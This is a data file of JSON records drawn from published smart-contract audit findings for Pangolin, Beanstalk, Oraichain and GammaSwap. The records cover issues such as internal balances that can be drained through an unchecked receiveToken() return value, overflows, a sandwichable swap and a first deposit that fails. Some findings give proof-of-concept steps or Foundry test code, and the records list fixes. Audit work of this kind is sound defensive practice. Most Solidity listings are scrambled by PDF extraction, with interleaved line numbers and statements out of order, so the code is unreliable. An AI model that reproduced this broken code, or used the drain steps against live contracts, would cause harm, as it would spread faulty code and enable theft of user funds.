bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met: 1. Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable. 2. There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, your code is NOT affected: 40 1. If all the structs or arrays only use uint256 or int256 types. 2. If you only use integer types (that may be shorter) and only encode at most one array at a time. 3. If you only return such data and do not use it in abi.encode, external calls or event data. ABIEncoderV2 is enabled to be able to pass struct type into a function both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but we expect that this is more likely to lead to malfunction than exploitability. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Reference: https://blog.ethereum.org/2019/03/26/solidity-optimizer-and-abiencoderv2-bug/ Code Location: Listing 10 1 RewarderComplex . sol :4: pragma experimental ABIEncoderV2 ; 2 GovernorAlpha . sol :2: pragma experimental ABIEncoderV2 ; 3 PNG . sol :2: pragma experimental ABIEncoderV2 ; 4 MiniChefV2 . sol :4: pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: When possible, do not use experimental features in the final live deployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 41 Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 42 3.10 (HAL-10) EXTERNAL CALLS WITHIN A LOOP - LOW ", "labels": ["Halborn", "Pangolin", "Severity: Informational"]}, {"title": "INTERNAL BALANCE TOKENS CAN BE DRAINED THROUGH THE CURVEFACET.EXCHANGEUNDERLYING FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the CurveFacet, the exchangeUnderlying() function is used to swap underlying assets from different Curve stable pools: Listing 1: CurveFacet.sol (Lines 70,72,76,77) ( int128 i , int128 j ) = getUnderlyingIandJ ( fromToken , toToken , IERC20 ( fromToken ). receiveToken ( amountIn , msg . sender , fromMode ) IERC20 ( fromToken ). approveToken ( pool , amountIn ); if ( toMode == LibTransfer . To . EXTERNAL ) { ICurvePoolR ( pool ). exchange_underlying ( 66 function exchangeUnderlying ( address pool , 67 address fromToken , 68 address toToken , 69 uint256 amountIn , 70 uint256 minAmountOut , 71 LibTransfer . From fromMode , 72 73 LibTransfer . To toMode 74 ) external payable nonReentrant { 75  pool ); 76  ; 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 i , j , amountIn , minAmountOut , msg . sender i , j , amountIn , } else { ); uint256 amountOut = ICurvePool ( pool ). exchange_underlying ( 18 minAmountOut ); msg . sender . increaseInternalBalance ( IERC20 ( toToken ) , 92 93 94  amountOut ); } 95 96 } The LibTransfer.From fromMode has 4 different modes:  EXTERNAL  INTERNAL  EXTERNAL_INTERNAL  INTERNAL_TOLERANT With the INTERNAL_TOLERANT fromMode tokens will be collected from the users Internal Balance and the transaction will not fail if there is not enough tokens there. As in the receiveToken() call, users can use the INTERNAL_TOLERANT fromMode and the value returned by receiveToken() is not checked users can abuse this and swap tokens that belong to other users (tokens that are part of other users internal balance). Proof of Concept: Pool: 0x99AE07e7Ab61DCCE4383A86d14F61C68CdCCbf27 Underlying WBTC: 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599 Underlying sBTC: 0xfE18be6b3Bd88A2D2A7f928d00292E7a9963CfC6 1. User8 transfers 10_000000000000000000 sBTC tokens to his internal balance. 2. User2 calls exchangeUnderlying() with an INTERNAL_TOLERANT fromMode, setting as the amountIn 10_000000000000000000 and as fromToken the sBTC token address. These sBTC tokens do belong to user8. 3. User2 successfully swaps for free the sBTC for the WBTC tokens, getting 10_00184757 WBTC in his external balance. 19 4. Now to tries User8 withdraw the 10_000000000000000000 sBTC tokens he had deposited previously, but the transactions fails as the contract does not have those tokens anymore. They were swapped and stolen by user2. internal balance from his Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to save the return value of the receiveToken() call and overwrite the amountIn variable with that return as shown below: Listing 2: CurveFacet.sol (Line 76) 66 function exchangeUnderlying ( address pool , 67 address fromToken , 68 address toToken , 69 uint256 amountIn , 70 uint256 minAmountOut , 71 LibTransfer . From fromMode , 72 73 LibTransfer . To toMode 74 ) external payable nonReentrant { 75  pool ); ( int128 i , int128 j ) = getUnderlyingIandJ ( fromToken , toToken , 20 amountIn = IERC20 ( fromToken ). receiveToken ( amountIn , msg . sender IERC20 ( fromToken ). approveToken ( pool , amountIn ); if ( toMode == LibTransfer . To . EXTERNAL ) { ICurvePoolR ( pool ). exchange_underlying ( uint256 amountOut = ICurvePool ( pool ). exchange_underlying ( ); msg . sender . increaseInternalBalance ( IERC20 ( toToken ) , 76  , fromMode ); 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94  amountOut ); } 95 96 } } else { ); i , j , amountIn , minAmountOut , msg . sender i , j , amountIn , minAmountOut Remediation Plan: SOLVED: The Beanstalk team corrected the issue by overwritting amountIn with the value returned from the receiveToken() call, as suggested. 21 ", "labels": ["Halborn", "Beanstalk", "Severity: Critical"]}, {"title": "USDC OF THE INTERNAL BALANCE CAN BE DRAINED BY ANY USER THROUGH THE FERTILIZERFACET.MINTFERTILIZER FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the FertilizerFacet, the mintFertilizer() function is used to buy Fertilizer in exchange for USDC: Listing 3: FertilizerFacet.sol (Lines 43-48) uint256 remaining = LibFertilizer . remainingRecapitalization () ; uint256 _amount = uint256 ( amount ); if ( _amount > remaining ) _amount = remaining ; LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 LibTransfer . From mode 38 39 ) external payable { 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  s . bpf ); 55 } C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode ); uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , amount , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , This function has the same issue that was described in HAL01 - INTERNAL BALANCE TOKENS CAN BE DRAINED THROUGH THE CURVEFACET.EXCHANGEUNDERLYING 22 FUNCTION as the value returned by receiveToken() is not checked, users can abuse this and buy Fertilizer with the USDC of other users internal balance through the INTERNAL_TOLERANT fromMode. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to save the return value of the receiveToken() call and overwrite the _amount variable with that return as shown below: Listing 4: FertilizerFacet.sol (Line 43) uint256 remaining = LibFertilizer . remainingRecapitalization () ; uint256 _amount = uint256 ( amount ); if ( _amount > remaining ) _amount = remaining ; _amount = LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 38 LibTransfer . From mode 39 ) external payable { 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  s . bpf ); 55 } C . usdc () , uint256 ( _amount ). mul (1 e6 ) , msg . sender , mode ); uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , uint128 ( _amount ) , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , 23 Remediation Plan: SOLVED: The Beanstalk team corrected the issue by considering the returned value of the receiveToken() call: Listing 5: FertilizerFacet.sol (Line 42) uint128 remaining = uint128 ( LibFertilizer . if ( amount > remaining ) amount = remaining ; amount = uint128 ( LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 38 LibTransfer . From mode 39 ) external payable { 40  remainingRecapitalization () ); // remaining <= 77 _000_000 so  downcasting is safe . 41 42 43 44 45 46 47  . 48 49 50 51 52 53  s . bpf ); 54 } C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode uint128 (s . season . current ) , amount , minLP uint128 id = LibFertilizer . addFertilizer ( ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , ). div (1 e6 )); // return value <= amount , so downcasting is safe 24 ", "labels": ["Halborn", "Beanstalk", "Severity: Critical"]}, {"title": "INCONSISTENT INTERNAL BALANCES WHEN SUPPLYING TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the library LibTransfer, used by the TokenFacet contract, the transferToken() function assume that the amount of token is transferred to the smart contract after calling token.safeTransferFrom(sender, address(this), amount - receivedAmount); (and thus it updates the states variables accordingly). For example: Listing 6: LibTransfer.sol (Lines 37,38,74) if ( fromMode == From . EXTERNAL && toMode == To . EXTERNAL ) { token . transferFrom ( msg . sender , recipient , amount ); return amount ; } amount = receiveToken ( token , amount , msg . sender , fromMode ); sendToken ( token , amount , recipient , toMode ); return amount ; 29 function transferToken ( IERC20 token , 30 address recipient , 31 uint256 amount , 32 From fromMode , 33 34 To toMode 35 ) internal returns ( uint256 transferredAmount ) { 36 37 38 39 40 41 42 43 } 44 45 function receiveToken ( IERC20 token , 46 uint256 amount , 47 address sender , 48 49 From mode 50 ) internal returns ( uint256 receivedAmount ) { 51 52 if ( amount == 0) return 0; if ( mode != From . EXTERNAL ) { 25 receivedAmount = LibBalance . decreaseInternalBalance ( sender , token , amount , mode != From . INTERNAL ); if ( amount == receivedAmount || mode == From . return receivedAmount ; } token . safeTransferFrom ( sender , address ( this ) , amount - return amount ; 53 54 55 56 57 58 59  INTERNAL_TOLERANT ) 60 61 62  receivedAmount ); 63 64 } 65 66 function sendToken ( 67 68 69 70 71 ) internal { 72 73 74  amount ); 75 76 } IERC20 token , uint256 amount , address recipient , To mode if ( amount == 0) return ; if ( mode == To . INTERNAL ) LibBalance . increaseInternalBalance ( recipient , token , else token . safeTransfer ( recipient , amount ); However, this may not be true if the token is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in the different state variables. 26 Proof of Concept: Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to get the actual received token amount by calculating the difference of token balance before and after the transfer. Remediation Plan: SOLVED: The transfer-on-fee tokens: Beanstalk team addressed the issue and now supports Listing 7: LibTransfer.sol (Lines 38,39,40,64,65,66,) 30 function transferToken ( IERC20 token , 31 address recipient , 32 uint256 amount , 33 From fromMode , 34 To toMode 35 36 ) internal returns ( uint256 transferredAmount ) { 37 38 39 40 uint256 beforeBalance = token . balanceOf ( recipient ); token . safeTransferFrom ( msg . sender , recipient , amount ); return token . balanceOf ( recipient ). sub ( beforeBalance ); if ( fromMode == From . EXTERNAL && toMode == To . EXTERNAL ) { 27 } amount = receiveToken ( token , amount , msg . sender , fromMode ); sendToken ( token , amount , recipient , toMode ); return amount ; if ( amount == 0) return 0; if ( mode != From . EXTERNAL ) { 41 42 43 44 45 } 46 47 function receiveToken ( IERC20 token , 48 uint256 amount , 49 address sender , 50 51 From mode 52 ) internal returns ( uint256 receivedAmount ) { 53 54 55 56 57 58 59 60 61  INTERNAL_TOLERANT ) 62 63 64 65  receivedAmount ); 66  beforeBalance )); 67 } sender , token , amount , mode != From . INTERNAL return receivedAmount ; ); if ( amount == receivedAmount || mode == From . } uint256 beforeBalance = token . balanceOf ( address ( this )) ; token . safeTransferFrom ( sender , address ( this ) , amount - return receivedAmount . add ( token . balanceOf ( address ( this )) . sub ( receivedAmount = LibBalance . decreaseInternalBalance ( 28 ", "labels": ["Halborn", "Beanstalk", "Severity: Medium"]}, {"title": "UNLIMITED FERTILIZER CAN BE BOUGHT THROUGH THE FERTILIZERFACET.MINTFERTILIZER FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the FertilizerFacet contract, the mintFertilizer() function checks if the amount provided by the user is higher than the remaining amount of Fertilizer and if that is the case, _amount is overwritten with the remaining Fertilizer preventing users to buy more Fertilizer than what is remaining: Listing 8: FertilizerFacet.sol (Lines 42,45,51) uint256 remaining = LibFertilizer . remainingRecapitalization () ; uint256 _amount = uint256 ( amount ); if ( _amount > remaining ) _amount = remaining ; LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 38 LibTransfer . From mode 39 ) external payable { 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  s . bpf ); 55 } C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode ); uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , amount , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , 29 Although, the contract wrongly uses the amount variable instead of _amount allowing users to mint more Fertilizer than what is remaining: Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use the _amount variable instead of amount for the receiveToken(), the and FertilizerFacet.mintFertilizer() function. beanstalkMint() addFertilizer() calls in Remediation Plan: SOLVED: The Beanstalk team corrected the issue: Listing 9: FertilizerFacet.sol (Line 41) 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 LibTransfer . From mode 38 39 ) external payable { 40  remainingRecapitalization () ); // remaining <= 77 _000_000 so  downcasting is safe . 41 if ( amount > remaining ) amount = remaining ; uint128 remaining = uint128 ( LibFertilizer . 30 amount = uint128 ( LibTransfer . receiveToken ( C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode ). div (1 e6 )); // return value <= amount , so downcasting is safe uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , amount , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , 42 43 44 45 46 47  . 48 49 50 51 52 53  s . bpf ); 54 } 31 ", "labels": ["Halborn", "Beanstalk", "Severity: Medium"]}, {"title": "ACTIVE FERTILIZER WILL BE CLAIMED AUTOMATICALLY BY THE SENDER DURING A SAFETRANSFERFROM CALL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Fertilizer contract contains the following _beforeTokenTransfer() hook: Listing 10: Fertilizer.sol (Lines 59,60) 50 function _beforeTokenTransfer ( address , // operator , 51 address from , 52 address to , 53 uint256 [] memory ids , 54 uint256 [] memory , // amounts 55 56 bytes memory // data 57 ) internal virtual override { 58 59 60 61 } uint256 bpf = uint256 ( IBS ( owner () ). beansPerFertilizer () ); if ( from != address (0) ) _update ( from , ids , bpf ); _update ( to , ids , bpf ); will hook or with This safeBatchTransferFrom() call and will claim the fertilizer claimable amount automatically on behalf of the sender: safeTransferFrom() called every be 32 If the amount of claimable fertilizer is zero, the receiver will get the full unfertilized amount as expected: This could allow the following scenario: 1. By making use of a third-party marketplace, user1 puts for sale his Fertilizer at a low price. That fertilizer id can be fully claimed at that time. 2. User2 buys the fertilizer planning to claim it afterwards and make some profit, but the fertilizer is claimed automatically on behalf of user1 during the safeTransferFrom() call and the user2 just receives an already claimed fertilizer. Risk Level: Likelihood - 3 Impact - 2 33 Recommendation: It is recommended to consider removing the _beforeTokenTransfer() hook so these claims are not done automatically, preventing the scenario mentioned. Remediation Plan: RISK ACCEPTED: The Beanstalk team accepts this risk. 34 ", "labels": ["Halborn", "Beanstalk", "Severity: Low"]}, {"title": "SEASONFACET.INCENTIVIZE EXPONENTIAL INCENTIVE LOGIC IS NOT WORKING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the SeasonFacet contract, the incentivize() function is used to send some Beans to the user that successfully called sunrise() to start a new season: Listing 11: SeasonFacet.sol (Lines 75,76) uint256 timestamp = block . timestamp . sub ( s . season . start . add (s . season . period . mul ( season () )) ); if ( timestamp > 300) timestamp = 300; uint256 incentive = LibIncentive . fracExp ( amount , 100 , 70 function incentivize ( address account , uint256 amount ) private { 71 72 73 74 75  timestamp , 1) ; 76 77 78 } C. bean () . mint ( account , amount ); emit Incentivization ( account , incentive ); As we can see, the rewards/timestamp is capped at a maximum of 300 seconds and makes use of exponential rewards. But then, in the mint call, the amount parameter is incorrectly used instead of incentive, which means that the caller will always receive a fixed amount of beans (100): 35 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to update the incentivize() function as shown below so the exponential rewards implementation is used: Listing 12: SeasonFacet.sol (Line 76) uint256 timestamp = block . timestamp . sub ( s . season . start . add (s . season . period . mul ( season () )) ); if ( timestamp > 300) timestamp = 300; uint256 incentive = LibIncentive . fracExp ( amount , 100 , 70 function incentivize ( address account , uint256 amount ) private { 71 72 73 74 75  timestamp , 1) ; 76 77 78 } C. bean () . mint ( account , incentive ); emit Incentivization ( account , incentive ); would This be implementation: the rewarded beans with the suggested/corrected Remediation Plan: SOLVED: The Beanstalk team corrected the issue and updated the code as suggested. 36 ", "labels": ["Halborn", "Beanstalk", "Severity: Low"]}, {"title": "MISSING REQUIRE CHECK IN TOKENFACET.WRAPETH FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the TokenFacet contract, the wrapEth(uint256 amount, LibTransfer.To mode) function wraps the amountof Ether into WETH and sends it to the user internal/external balance: Listing 13: TokenFacet.sol 52 function wrapEth ( uint256 amount , LibTransfer . To mode ) external  payable { 53 54 } LibWeth . wrap ( amount , mode ); Listing 14: LibWeth.sol (Lines 20,21) 19 function wrap ( uint256 amount , LibTransfer . To mode ) internal { 20 21 22 } deposit ( amount ); LibTransfer . sendToken ( IERC20 ( WETH ) , amount , msg . sender , mode ); As the msg.value is never compared to the amount parameter, if the msg. value sent by the user was higher than the amount the difference would be taken by the contract and any other user would be able to steal it. 37 Proof of Concept: Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to add a require statement that checks that msg.value is equal to the amount parameter set in the wrapEth() call. Remediation Plan: SOLVED: The Beanstalk team corrected the issue. Ether refunds were added instead of a require check. If there is leftover Ether in the contract, then it will be refunded. 38 ", "labels": ["Halborn", "Beanstalk", "Severity: Low"]}, {"title": "MULTIPLE OVERFLOWS IN MARKETPLACEFACET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the MarketplaceFacet there are multiple overflows that can cause some inconsistencies. One of them is located in the _createPodListing() function: Listing 15: Listing.sol (Line 60) uint256 plotSize = s. a [ msg . sender ]. field . plots [ index ]; require ( plotSize >= ( start + amount ) && amount > 0, \" Marketplace : Invalid Plot / Amount . \" 0 < pricePerPod , \" Marketplace : Pod price must be greater than 0. \" s .f . harvestable <= maxHarvestableIndex , \" Marketplace : Expired .\" ); require ( uint256 index , uint256 start , uint256 amount , uint24 pricePerPod , uint256 maxHarvestableIndex , LibTransfer . To mode 50 function _createPodListing ( 51 52 53 54 55 56 57 ) internal { 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  index ); 73 74 75 76 77 78 start , amount , pricePerPod , maxHarvestableIndex , ); require ( ); if ( s . podListings [ index ] != bytes32 (0) ) _cancelPodListing ( s. podListings [ index ] = hashListing ( 39 mode ); emit PodListingCreated ( msg . sender , index , start , amount , pricePerPod , maxHarvestableIndex , mode ); 79 80 81 82 83 84 85 86 87 88 89 90 91 } The require(plotSize >= (start + amount)&& amount > 0, \"Marketplace: Invalid Plot/Amount.\"); overflow allows users to create PodListings of very high amounts, although this can not be exploited since when removing the Plots from the seller through the removePlot() function SafeMath is used and the transaction reverts: Listing 16: PodTransfer.sol (Line 82) 72 function removePlot ( address account , 73 uint256 id , 74 uint256 start , 75 uint256 end 76 77 ) internal { 78 79 80 81 82 83 } uint256 amount = s . a[ account ]. field . plots [ id ]; if ( start == 0) delete s . a[ account ]. field . plots [ id ]; else s. a [ account ]. field . plots [ id ] = start ; if ( end != amount ) s .a [ account ]. field . plots [ id . add ( end )] = amount . sub ( end ); 40 On the other hand, a similar issue occurs in the roundAmount() function: Listing 17: Listing.sol (Line 169) 162 // If remainder left ( always <1 pod ) that would otherwise be  unpurchaseable 163 // due to rounding from calculating amount , give it to last buyer 164 function roundAmount ( PodListing calldata l , uint256 amount ) 165 166 167 168 { 169 private pure returns ( uint256 ) if (( l. amount - amount ) < (1000000 / l . pricePerPod )) amount =  l . amount ; 170 171 } return amount ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to make use of the SafeMath library in the functions described above. Remediation Plan: SOLVED: The Beanstalk team corrected the issue. All the overflows were addressed. 41 ", "labels": ["Halborn", "Beanstalk", "Severity: Low"]}, {"title": "FERTILIZERPREMINT.BUYANDMINT FUNCTION COULD BE SANDWICHED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the FertilizerPreMint, the function buy() is used to swap Ether into USDC through the UniswapV3 router: Listing 18: FertilizerPreMint.sol (Line 104) ISwapRouter . ExactInputSingleParams ({ IWETH ( WETH ). deposit { value : msg . value }() ; ISwapRouter . ExactInputSingleParams memory params = 94 function buy ( uint256 minAmountOut ) private returns ( uint256  amountOut ) { 95 96 97 98 99 100 101 102 103 104 105 106 107 108 } tokenIn : WETH , tokenOut : USDC , fee : POOL_FEE , recipient : CUSTODIAN , deadline : block . timestamp , amountIn : msg . value , amountOutMinimum : minAmountOut , sqrtPriceLimitX96 : 0 }) ; amountOut = ISwapRouter ( SWAP_ROUTER ). exactInputSingle ( params ); The amountOutMinimum is set with a user controlled parameter minAmountOut . If the Ether sent through msg.value is higher than the minAmountOut in USDC the transaction may get sandwiched causing the user to swap Ether for USDC at a higher cost, receiving less USDC for the same amount of Ether. The issue was flagged as informational, as there is a function in the FertilizerPreMint contract that allows to get the exact amount of USDC for a given amount of Ether after swap. We assume that this function is 42 used in the backend mitigating the issue. Only users interacting with the smart contract directly may have the problem described. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to inform the users, specially whales, that they should try to avoid interacting with the smart contract directly for this and that if they do, inform them on how they should determine the minAmountOut preventing them from getting sandwiched. Remediation Plan: SOLVED: The Beanstalk team documented their code mentioning that any slippage should be properly accounted by the users: Listing 19: FertilizerPreMint.sol (Line 49) 49 // Note : Slippage should be properly be accounted for in 50 // minBuyAmount when calling the buyAndMint function directly . 51 function buyAndMint ( uint256 minBuyAmount ) external payable  nonReentrant { 52 53  Not enough remaining \"); 54 55 } uint256 amount = buy ( minBuyAmount ); require ( IUSDC . balanceOf ( CUSTODIAN ) <= MAX_RAISE , \" Fertilizer : __mint ( amount ); 43 3.10 (HAL-10) POD PRICE IS LIMITED TO 16.7 BEANS - INFORMATIONAL ", "labels": ["Halborn", "Beanstalk", "Severity: Informational"]}, {"title": "3.1 DOCUMENTATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Oraichain_CosmWasm_SmartContract_Halborn_Report_v1.pdf", "body": "The documentation to set up the environment and interact with it re- quires many libraries and packages not included there. Furthermore, for simulating the smart contracts interactions by cosmwasm-simulate tool, the documentation was provided by Oraichain team but not included in the repository. Recommendation: Consider updating the documentation. ", "labels": ["Halborn", "Oraichain_CosmWasm_SmartContract_Halborn", "Severity: Informational"]}, {"title": "3.2 VULNERABILITY SCANNING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Oraichain_CosmWasm_SmartContract_Halborn_Report_v1.pdf", "body": "Halborn used automated security scanners to assist with detection of well- known security issues and vulnerabilities. Among the tools used was cargo- audit, a security scanner for vulnerabilities reported to the RustSec Advisory Database. All vulnerabilities published in https://crates.io are stored in a repository named The RustSec Advisory Database. cargo- audit is a human-readable version of the advisory database which performs a scanning on Cargo.lock. Security Detections are only in scope. Reference: https://rustsec.org/advisories/ 8 Results: No vulnerabilities were founded. ", "labels": ["Halborn", "Oraichain_CosmWasm_SmartContract_Halborn", "Severity: Informational"]}, {"title": "] for initializing variables. 10 THANK YOU FOR CHOOSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Oraichain_CosmWasm_SmartContract_Halborn_Report_v1.pdf", "body": "Halborn used cargo-clippy code analysis tool to detect common mistakes and possible improvements in Rust code. More than 400 recommendations are stored in rust-lang. Reference: https://rust-lang.github.io/rust-clippy/master/index.html Results: 9 Recommendation: Its faster using a char than using a str for string methods that receive So, its better to use x a single-character str as an argument. instead of x because multi-byte unicode characters could be not cached. Otherwise, its widely accepted to use #[derive(Serialize, Deserialize, Clone, Debug, PartialEq, JsonSchema)] for initializing variables. 10 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Oraichain_CosmWasm_SmartContract_Halborn", "Severity: Informational"]}, {"title": "INITIAL LP DEPOSIT IS IMPOSSIBLE DUE TO MISCALCULATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _depositNoPull() function in the BaseStrategy contract does not work properly. The first deposit is reverted with the ZeroAmount() error. In the _depositNoPull() function, the updateIndex() internal function is invoked with accFeeIndex, lastFeeIndex and lastCFMMFeeIndex call param- eters. If the value of the s.BORROWED_INVARIANT variable is positive, then some LP tokens are minted to developers, since the protocol charges It has been observed however that the contract also a handling fee. tries to mint LP tokens to developers even if the s.BORROWED_INVARIANT is zero. In this case, the devShares variable returns zero since there are no deposits in the contract and s.totalSupply is equal to zero, which prevents users from depositing funds in the contract. 18 Proof of Concept: Listing 1: First Deposit Fails - PoC uint256 loanId2 = positionManager . createLoan (1 , address ( uint256 loanId = positionManager . createLoan (1 , address ( vm . roll (16392000 + 1) ; // deployment block + 1 _addLiquidityWithUniRouter ( deployer , address ( usdt ) , vm . startPrank ( deployer ); usdt . transfer ( user1 , 5 * 1 e6 ); weth . transfer ( user1 , 2 * 1 e18 ); usdt . transfer ( user2 , 6 * 1 e6 ); weth . transfer ( user2 , 10 * 1 e18 ); 1 function test_depositNoPullPoC () public { 2 3  address ( weth ) , 50 * 1e6 , 10 * 1 e18 ); 4 5 6 7 8 9 10 11 12 13 14  cfmm_usdt_weth ) , deployer , type ( uint ). max ); 15  cfmm_usdt_weth ) , user2 , type ( uint ). max ); 16 17 18  = IPositionManager . DepositWithdrawParams ({ protocolId : 1, 19 cfmm : address ( cfmm_usdt_weth ) , 20 to : user1 , 21 lpTokens : cfmm_usdt_weth . balanceOf ( deployer ) , 22 23 deadline : 99999 24 25 26  cfmm_usdt_weth . balanceOf ( deployer )) ; 27 28 29 30 31 cfmm_usdt_weth . approve ( address ( positionManager ) , positionManager . depositNoPull ( depositData ); vm . stopPrank () ; }) ; } positionManager . transferFrom ( deployer , user1 , loanId ); IPositionManager . DepositWithdrawParams memory depositData 19 Screenshot: Code Location: BaseStrategy Listing 2: BaseStrategy (Lines 94,95) lastCFMMFeeIndex = updateCFMMIndex () ; lastFeeIndex = updateFeeIndex ( lastCFMMFeeIndex ); accFeeIndex = updateStore ( lastFeeIndex ); if (s . BORROWED_INVARIANT >= 0) { 90 function updateIndex () internal virtual returns ( uint256  accFeeIndex , uint256 lastFeeIndex , uint256 lastCFMMFeeIndex ) { 91 92 93 94 95 96 97 } mintToDevs ( lastFeeIndex , lastCFMMFeeIndex ); } BaseStrategy Listing 3: BaseStrategy (Line 126) if ( amount == 0) { revert ZeroAmount () ; 124 function _mint ( address account , uint256 amount ) internal virtual { 125 126 127 128 129 130 131 } } s. totalSupply += amount ; s. balanceOf [ account ] += amount ; emit Transfer ( address (0) , account , amount ); 20 Risk Level: Likelihood - 5 Impact - 3 Recommendation: Replace the greater than or equal to (>=) symbol with greater (>) to pre- vent calling the mintToDevs function for the first deposit. Remediation Plan: SOLVED: This finding was identified in a live code walkthrough jointly by the GammaSwap team and the Halborn team, and the existence of the finding was confirmed by the Halborn team. The greater than or equal to (>=) relation was replaced with greater than (>) relation. Commit ID: v1-strategies::6f6a7ba1f0fe8b9d7a7cb9b756ef5b3e6bfa55ab 21 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: High"]}, {"title": "FIRST LIQUIDITY PROVIDER LOSES FUNDS DUE TO ROUNDING ISSUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the initial asset deposit for ERC4626 Vaults, first liquidity provider can lose funds due to rounding issues. The risk above was already explained in EIP4626 standard: Finally, ERC-4626 Vault implementers should be aware of the need for specific, opposing rounding directions across the different mutable and view methods, as it is considered most secure to favor the Vault itself during calculations over its users: If (1) its calculating how many shares to issue to a user for a certain amount of the underlying tokens they provide or (2) its determining the amount of the underlying tokens to transfer to them for returning a certain amount of shares, it should round down. If (1) its calculating the amount of shares a user has to supply to receive a given amount of the underlying tokens or (2) its calculating the amount of underlying tokens a user has to provide to receive a certain amount of shares, it should round up. The current ShortStrategyERC4626 contract does not have any rounding validations for the security consideration above. Thus, the contract is vulnerable to the front-running attack. In this case, any attacker can front-run the first deposit operation to claim more assets during the _redeem call. 22 vm . roll (16392000 + 1) ; // deployment block + 1 _addLiquidityWithUniRouter ( deployer , address ( usdt ) , _addLiquidityWithUniRouter ( user1 , address ( usdt ) , address ( vm . startPrank ( user1 ); cfmm_usdt_weth . approve ( address ( univ2_usdt_weth_pool ) , 1) ; uint256 balance = cfmm_usdt_weth . balanceOf ( user1 ); 